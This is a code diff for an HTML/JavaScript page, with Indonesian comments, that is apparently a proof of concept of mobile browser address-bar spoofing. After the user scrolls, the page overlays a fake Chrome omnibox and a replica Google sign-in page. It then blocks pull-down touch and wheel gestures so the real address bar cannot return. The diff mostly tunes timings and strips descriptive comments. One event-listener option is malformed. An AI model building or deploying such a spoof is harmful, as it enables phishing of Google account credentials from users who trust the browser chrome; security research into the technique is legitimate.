@@ -22,7 +22,7 @@
     body {
         margin: 0;
         padding: 0;
-        height: 4500px; /* Panjang halaman untuk memicu auto-hide omnibox asli */
+        height: 5000px; /* Panjang halaman optimal untuk memicu auto-hide omnibox secara natural */
         font-family: Roboto, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
         background-color: var(--bg-color);
         color: var(--text-primary);
@@ -239,13 +239,13 @@
 <body>
 
 <div class="instructions" id="instructionBox">
-    <h1>Full Chaining Login UI Simulation</h1>
-    <p>1. Gulir ke bawah secara perlahan sampai bilah alamat asli Chrome tersembunyi (auto-hide).<br>
-       2. Berhenti sebentar untuk mengaktifkan rantai eksekusi.<br>
-       3. Tampilan otentikasi login Google dan Top Bar dikunci total secara sinkron.</p>
+    <h1>Full Chaining Advanced Simulation</h1>
+    <p>1. Gulir ke bawah sampai bilah alamat asli tersembunyi.<br>
+       2. Sistem rantai eksekusi otomatis mengunci posisi.<br>
+       3. Tampilan UI login Google terkunci sempurna.</p>
 </div>
 
-<!-- Fake Chrome Top Bar & Omnibox (Menampilkan Domain Akun Google Resmi Palsu) -->
+<!-- Fake Chrome Top Bar & Omnibox -->
 <div id="fakeTopChrome">
     <div class="fake-browser-header">
         <div class="fake-omnibox">
@@ -260,10 +260,9 @@
     </div>
 </div>
 
-<!-- Google Login Page UI Layout (Persis Asli) -->
+<!-- Google Login Page UI Layout -->
 <div id="googleLoginView">
     <div class="login-container">
-        <!-- Google Logo SVG Resmi -->
         <svg class="google-logo-svg" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
             <path fill="#4285F4" d="M9.8 12.4c0-.9-.1-1.8-.3-2.6H4.8v4.9h5.1c-.2 1.2-.9 2.2-1.9 2.9v2.4h3.1c1.8-1.7 3-4.2 3-7.6z"/>
             <path fill="#34A853" d="M4.8 17.5c1.6 0 3-.5 4.1-1.4l-3.1-2.4c-.6.4-1.3.7-2.1.7-1.6 0-3-1.1-3.5-2.6H.6v2.5c1.1 2.2 3.4 3.2 5.7 3.2z"/>
@@ -293,23 +292,23 @@
 
 <script>
     let isChainingActive = false;
-    let scrollCounter = 0;
+    let scrollCheckCount = 0;
 
-    // Chaining Tahap 1: Deteksi scroll berkelanjutan untuk memastikan auto-hide omnibox sukses
+    // Chaining Tahap 1: Memantau pergerakan scroll secara presisi
     window.addEventListener('scroll', function() {
         if (isChainingActive) return;
 
-        if (window.scrollY > 180) {
-            scrollCounter++;
-            if (scrollCounter > 3) {
-                document.getElementById('statusIndicator').innerText = "Status: Ambang batas tercapai, mengunci UI & Login View...";
-                setTimeout(triggerFullUIChaining, 2500);
+        if (window.scrollY > 250) {
+            scrollCheckCount++;
+            if (scrollCheckCount > 2) {
+                document.getElementById('statusIndicator').innerText = "Status: Target tercapai, menginisialisasi UI Lock...";
+                setTimeout(triggerFullUIChaining, 2000);
                 isChainingActive = true;
             }
         }
     }, { passive: true });
 
-    // Chaining Tahap 2: Sinkronisasi mutlak layout agar tidak terjadi pergeseran (layout shift)
+    // Chaining Tahap 2: Sinkronisasi mutlak elemen overlay agar presisi di posisi layar saat ini
     function triggerFullUIChaining() {
         let currentY = window.scrollY;
         let loginView = document.getElementById("googleLoginView");
@@ -317,30 +316,27 @@
         let indicator = document.getElementById("statusIndicator");
         let instructions = document.getElementById("instructionBox");
 
-        // Sembunyikan instruksi panduan
         instructions.style.display = 'none';
 
-        // Terapkan posisi koordinat absolut secara instan
         loginView.style.top = currentY + "px";
         loginView.style.display = "block";
         fakeTopChrome.style.display = "flex";
 
-        indicator.innerText = "Status: Full Chaining Aktif - Login UI Locked!";
+        indicator.innerText = "Status: Full Chaining Aktif - UI Locked!";
         indicator.style.borderColor = "#f28b82";
 
-        // Kunci posisi scroll mati-matian
         window.scrollTo({
             top: currentY,
             behavior: 'instant'
         });
     }
 
-    // Chaining Tahap 3: Pencegatan Sentuhan Agresif (Memblokir gestur tarik ke bawah / Pull-to-Reveal)
+    // Chaining Tahap 3: Pencegatan Sentuhan Agresif untuk mengunci gestur pull-to-reveal secara total
     let touchStartY = 0;
 
     document.addEventListener("touchstart", function(e) {
         touchStartY = e.touches[0].clientY;
-    }, { passive: false });
+    }, { passive: { non-passive: true } });
 
     document.addEventListener("touchmove", function(e) {
         if (!isChainingActive) return;
@@ -348,13 +344,12 @@
         let currentTouchY = e.touches[0].clientY;
         let deltaY = currentTouchY - touchStartY;
 
-        // Jika ada upaya pengguna menarik layar ke bawah untuk memunculkan omnibox asli
+        // Memblokir gestur tarik ke bawah yang memicu kemunculan bilah alamat asli
         if (deltaY > 0) {
             e.preventDefault();
         }
     }, { passive: false });
 
-    // Kompatibilitas wheel event untuk desktop emulator
     document.addEventListener("wheel", function(e) {
         if (!isChainingActive) return;
         if (e.deltaY < 0) {
